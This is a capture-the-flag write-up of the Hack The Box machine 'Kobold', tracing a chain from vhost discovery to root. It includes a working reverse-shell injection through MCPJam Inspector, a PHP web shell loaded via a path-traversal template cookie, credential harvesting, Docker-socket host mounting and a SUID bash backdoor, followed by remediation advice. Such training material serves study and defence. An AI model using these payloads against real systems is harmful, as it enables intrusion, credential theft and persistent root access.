# Hack The Box — Kobold (Easy) Writeup

> **Author:** Muhammad Iqbal  
> **Platform:** Hack The Box  
> **Machine:** Kobold  
> **Difficulty:** Easy  
> **Target IP:** `10.129.245.50`  
> **Operating System:** Linux / Ubuntu 24.04.4 LTS  
> **Final Result:** User and root compromise achieved

---

## Executive Summary

Kobold exposed a small public-facing web footprint on ports `80` and `443`. The main site was only a static landing page, but its TLS certificate contained a wildcard entry for `*.kobold.htb`, which led to virtual-host enumeration. This revealed `mcp.kobold.htb`, hosting **MCPJam Inspector**.

The foothold was gained by abusing MCPJam's MCP server connection functionality. A crafted request to the MCP connection endpoint executed an attacker-controlled command and returned a reverse shell as the user `ben`.

Privilege escalation was multi-stage. After obtaining `ben`, a hidden PrivateBin instance was discovered at `bin.kobold.htb`, backed by a local Docker container. PrivateBin was running version `2.0.2` with template selection enabled. Since `ben` could write into the mounted PrivateBin data directory, a PHP payload was placed inside the data path and then loaded through the `template` cookie, resulting in code execution as `nobody` inside the PrivateBin container.

From the container, `/srv/cfg/conf.php` was readable and contained credentials for the Arcane dashboard. Logging into Arcane gave access to the local Docker socket. A container was then created with the host filesystem mounted, allowing the root flag to be read from `/root/root.txt`.

---

## Attack Chain Overview

| Stage | Technique | Result |
|---|---|---|
| Recon | Nmap scan | Found SSH, HTTP, HTTPS |
| Enumeration | TLS certificate + vhost fuzzing | Found `mcp.kobold.htb` |
| Foothold | MCPJam command execution | Reverse shell as `ben` |
| User flag | Local filesystem access | Read `/home/ben/user.txt` |
| Internal enumeration | Nginx config + Docker process review | Found `bin.kobold.htb` / PrivateBin |
| Lateral path | PrivateBin template include abuse | PHP execution as `nobody` in container |
| Credential discovery | Read `/srv/cfg/conf.php` | Found Arcane credentials |
| Privilege escalation | Arcane Docker dashboard | Docker socket access |
| Root | Host filesystem bind mount | Read `/root/root.txt` |

---

## 1. Initial Reconnaissance

The machine was first checked for reachability.

```bash
ping 10.129.245.50
```

The host responded successfully with a Linux-like TTL:

```text
64 bytes from 10.129.245.50: icmp_seq=1 ttl=63 time=196 ms
64 bytes from 10.129.245.50: icmp_seq=2 ttl=63 time=224 ms
64 bytes from 10.129.245.50: icmp_seq=3 ttl=63 time=247 ms
```

A basic Nmap scan identified three main open ports:

```bash
nmap 10.129.245.50
```

```text
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
443/tcp  open     https
1165/tcp filtered qsm-gui
```

A service/version scan gave more detail:

```bash
nmap -sC -sV 10.129.245.50
```

```text
22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http      nginx 1.24.0 (Ubuntu)
443/tcp  open  ssl/http  nginx 1.24.0 (Ubuntu)
```

The HTTPS certificate was important:

```text
Subject: commonName=kobold.htb
Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
```

The wildcard certificate strongly suggested that virtual-host enumeration would be useful.

---

## 2. Hostname Setup

The target was added to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
10.129.245.50 kobold.htb
```

HTTP redirected to HTTPS:

```bash
curl -I http://kobold.htb
```

```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Location: https://kobold.htb/
```

The main HTTPS page was then requested:

```bash
curl -k -i https://kobold.htb
```

It returned a static landing page titled **Kobold Operations Suite**.

Important footer clue:

```html
© 2026 Kobold Systems · Contact: admin@kobold.htb
```

At this point, the main page did not expose obvious interactive functionality, so the wildcard certificate became the main enumeration lead.

---

## 3. Virtual Host Enumeration

Virtual-host fuzzing was performed using `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://10.129.245.50/ -H "Host: FUZZ.kobold.htb" -k -ac
```

Result:

```text
mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]
```

The discovered vhost was added to `/etc/hosts`:

```text
10.129.245.50 kobold.htb mcp.kobold.htb
```

Visiting the new vhost revealed **MCPJam Inspector**.

```text
https://mcp.kobold.htb
```

The application showed a dashboard-like interface with MCP server management, tools, resources, prompts, tracing, and authentication options.

---

## 4. MCPJam Inspector Enumeration

The application responded to `OPTIONS` requests:

```bash
curl -k -i -X OPTIONS https://mcp.kobold.htb
```

```http
HTTP/1.1 204 No Content
Server: nginx/1.24.0 (Ubuntu)
access-control-allow-credentials: true
access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
vary: Origin
```

The frontend HTML identified the application as MCPJam Inspector:

```html
<title>MCPJam Inspector</title>
<script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
<link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
```

A health endpoint was also present:

```bash
curl -k -i https://mcp.kobold.htb/health
```

```json
{"status":"ok","timestamp":"2026-07-16T01:30:08.953Z"}
```

---

## 5. Foothold — MCPJam Command Execution

The suspected vulnerable endpoint was:

```text
/api/mcp/connect
```

A crafted request was sent to create a malicious MCP server configuration. The server-side command field was abused to execute a reverse shell.

Local listener:

```bash
nc -lvnp 4444
```

Exploit request:

```bash
curl -k -i https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.154/4444 0>&1"],"env":{}},"serverId":"shell"}'
```

The callback landed successfully:

```text
listening on [any] 4444 ...
connect to [10.10.14.154] from (UNKNOWN) [10.129.245.50] 37536
bash: cannot set terminal process group (1594): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

The foothold user was `ben`.

---

## 6. User Flag

The shell landed in the MCPJam installation directory:

```bash
pwd
```

```text
/usr/local/lib/node_modules/@mcpjam/inspector
```

The `/home` directory contained two users:

```bash
ls /home
```

```text
alice
ben
```

The user flag was readable from Ben's home directory:

```bash
cd /home/ben
cat user.txt
```

```text
e83fcb02684f6e21f42eda95b7970d12
```

---

## 7. Local Enumeration

Docker was installed, but `ben` did not have permission to use the Docker daemon:

```bash
which docker
```

```text
/usr/bin/docker
```

```bash
docker ps
```

```text
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock
```

The Docker group showed that only `alice` was a member:

```bash
cat /etc/group | grep docker
```

```text
docker:x:111:alice
```

Valid shell users:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

```text
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bash
```

Listening ports revealed internal services:

```bash
ss -tlnp
```

Interesting listeners:

```text
127.0.0.1:8080
127.0.0.1:6274
*:3552
```

The process list showed several important services:

```text
root        1591  /root/arcane_linux_amd64
ben         1594  node /usr/local/bin/inspector
root        1656  /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        2012  /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
```

This indicated that:

- Docker was running as root.
- Arcane was running as root.
- A containerized service was exposed locally on port `8080`.

---

## 8. Discovery of `bin.kobold.htb`

The Nginx configuration exposed another vhost:

```bash
cat /etc/nginx/sites-enabled/privatebin
```

```nginx
server {
    listen 80;
    server_name bin.kobold.htb;
    return 301 https://bin.kobold.htb$request_uri;
}

server {
    listen 443 ssl;
    server_name bin.kobold.htb;

    ssl_certificate /privatebin-data/certs/cert.pem;
    ssl_certificate_key /privatebin-data/certs/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

The `/etc/hosts` entry was updated:

```text
10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb
```

The site was then queried:

```bash
curl -k https://bin.kobold.htb/
```

The response identified the service as **PrivateBin 2.0.2**:

```html
<title>PrivateBin</title>
<link type="text/css" rel="stylesheet" href="css/bootstrap5/privatebin.css?2.0.2" />
<script defer type="text/javascript" src="js/privatebin.js?2.0.2"></script>
...
<h5>PrivateBin <small>- Because ignorance is bliss</small></h5>
<p class="col-md-1 col-xs-4 text-center">2.0.2</p>
```

---

## 9. PrivateBin Data Directory Access

The host contained a writable PrivateBin data directory:

```bash
find / -group operator 2>/dev/null
```

Interesting results:

```text
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

Inside the PrivateBin container, `/srv/data` mapped to this data directory. This became important because PrivateBin's template-switching functionality could be abused to include a PHP file from the data directory.

---

## 10. PrivateBin Template Include Abuse

A PHP payload was written into the PrivateBin data directory from the `ben` shell:

```bash
printf '%s\n' '<?php echo "PWNED\n"; system($_GET["cmd"] ?? "id"); exit; ?>' > /privatebin-data/data/pwn.php
```

The payload was verified:

```bash
ls -l /privatebin-data/data/pwn.php
```

```text
-rw-r--r-- 1 ben ben 61 Jul 16 01:53 /privatebin-data/data/pwn.php
```

The payload was triggered using the `template` cookie:

```bash
curl -sk 'https://bin.kobold.htb/?cmd=id' -b 'template=../data/pwn'
```

Successful code execution:

```text
PWNED
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

This confirmed code execution inside the PrivateBin container as `nobody:www-data`.

---

## 11. Container Enumeration

The container context was enumerated using the PHP payload:

```bash
curl -sk -G -b 'template=../data/pwn' --data-urlencode 'cmd=id;whoami;hostname;pwd;uname -a;cat /etc/os-release 2>/dev/null' https://bin.kobold.htb/
```

Output:

```text
PWNED
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
nobody
4c49dd7bb727
/var/www
Linux 4c49dd7bb727 6.8.0-106-generic #106-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 07:58:08 UTC 2026 x86_64 Linux
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.22.2
PRETTY_NAME="Alpine Linux v3.22"
```

Important paths:

```bash
curl -sk -G -b 'template=../data/pwn' --data-urlencode 'cmd=ls -la / /srv /srv/cfg /srv/data /var/www /tmp /run /run/secrets 2>/dev/null' https://bin.kobold.htb/
```

Key findings:

```text
/srv/cfg:
-rwxr-x--- 1 root www-data 25888 Mar 4 12:49 conf.php

/srv/data:
-rw-r--r-- 1 1001 1001 61 Jul 16 01:53 pwn.php
```

Because the RCE process ran in group `www-data`, it could read `/srv/cfg/conf.php`.

---

## 12. Credential Discovery in `/srv/cfg/conf.php`

The PrivateBin configuration was dumped:

```bash
curl -sk -G -b 'template=../data/pwn' --data-urlencode 'cmd=cat /srv/cfg/conf.php' https://bin.kobold.htb/
```

The configuration confirmed that template selection was enabled:

```ini
templateselection = true
availabletemplates[] = "bootstrap5"
availabletemplates[] = "bootstrap"
availabletemplates[] = "bootstrap-page"
availabletemplates[] = "bootstrap-dark"
availabletemplates[] = "bootstrap-dark-page"
availabletemplates[] = "bootstrap-compact"
availabletemplates[] = "bootstrap-compact-page"
```

A credential block was also present:

```ini
[model]
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
opt[12] = true
```

The password did not work for `alice` over SSH or `su`, but it did work for the Arcane dashboard.

---

## 13. Arcane Dashboard Access

The Arcane service was accessible on port `3552`:

```text
http://kobold.htb:3552
```

Credentials:

```text
Username: arcane
Password: ComplexP@sswordAdmin1928
```

After login, the dashboard displayed:

```text
Arcane | Local Docker
unix:///var/run/docker.sock
```

This was the final privilege-escalation primitive. Arcane had access to the Docker socket, meaning it could create containers with arbitrary bind mounts.

---

## 14. Root via Docker Socket Abuse

The Arcane dashboard listed available Docker images:

```text
mysql:latest
privatebin/nginx-fpm-alpine:2.0.2
```

A new container named `pwn` was created using an available image. The critical step was mounting the host filesystem inside the container.

The effective mount path in the created container was:

```text
/hostfs
```

Inside the Arcane container shell, the root flag was read directly:

```bash
cat /hostfs/root/root.txt
```

Output:

```text
5a1311efd90a29dd7be1ac64e254b294
```

This confirmed root-level access to the host filesystem through Docker.

---

## 15. Optional Root Shell

Since the host filesystem was mounted inside the container, an interactive host-root context could also be achieved with `chroot`:

```bash
chroot /hostfs /bin/bash
```

If Bash was unavailable:

```bash
chroot /hostfs /bin/sh
```

Another common method would be to create a SUID Bash binary on the host:

```bash
cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod 4755 /hostfs/tmp/rootbash
```

Then, from the original `ben` shell:

```bash
/tmp/rootbash -p
```

---

## Flags

| Flag | Value |
|---|---|
| User | `e83fcb02684f6e21f42eda95b7970d12` |
| Root | `5a1311efd90a29dd7be1ac64e254b294` |

---

## Vulnerability Summary

### MCPJam Inspector Command Execution

The `mcp.kobold.htb` service allowed a crafted MCP server configuration to execute arbitrary commands. By setting the MCP server command to `bash` and passing a reverse-shell payload as an argument, shell access was obtained as `ben`.

Impact:

- Remote command execution
- Initial foothold as a local user
- Access to internal files and services

---

### PrivateBin Template Include Abuse

PrivateBin `2.0.2` was configured with:

```ini
templateselection = true
```

Since `ben` could write to the mounted PrivateBin data directory, a PHP payload was placed at:

```text
/privatebin-data/data/pwn.php
```

The payload was loaded using:

```bash
-b 'template=../data/pwn'
```

This resulted in PHP code execution inside the PrivateBin container.

Impact:

- Arbitrary PHP execution inside container
- Read access to `/srv/cfg/conf.php`
- Credential disclosure

---

### Arcane Docker Socket Abuse

Arcane was running as a Docker management dashboard with access to:

```text
unix:///var/run/docker.sock
```

Access to the Docker socket is effectively root-equivalent on the host. By creating a container with the host filesystem mounted, the root flag could be read directly.

Impact:

- Full host filesystem access
- Root flag disclosure
- Potential persistent root shell via SUID binary or chroot

---

## Remediation Notes

| Issue | Recommended Fix |
|---|---|
| MCPJam command execution | Do not expose development/debug MCP tooling externally; restrict binding to localhost; require authentication and command allowlisting |
| Wildcard vhost exposure | Avoid exposing internal subdomains through public certificates where unnecessary |
| PrivateBin template selection abuse | Upgrade PrivateBin; disable template selection unless required; validate template names strictly |
| Writable shared data directory | Do not allow low-privileged host users to write PHP-loadable paths |
| Secrets in config comments | Remove unused or disabled credentials from configuration files |
| Arcane exposed externally | Bind Docker dashboards to localhost/VPN only; enforce strong authentication and least privilege |
| Docker socket access | Avoid mounting or exposing `/var/run/docker.sock`; treat Docker access as root-equivalent |

---

## Final Notes

Kobold was a clean multi-stage web-to-root chain. The box rewarded careful enumeration more than brute forcing. The key pivot points were:

1. Reading the TLS certificate and fuzzing vhosts.
2. Recognizing MCPJam as an execution surface.
3. Following internal services after obtaining `ben`.
4. Using PrivateBin's configuration and template behavior to pivot into the container.
5. Leveraging Arcane's Docker socket access for root.

The final root compromise was achieved through Docker filesystem mounting, confirming complete control over the host.
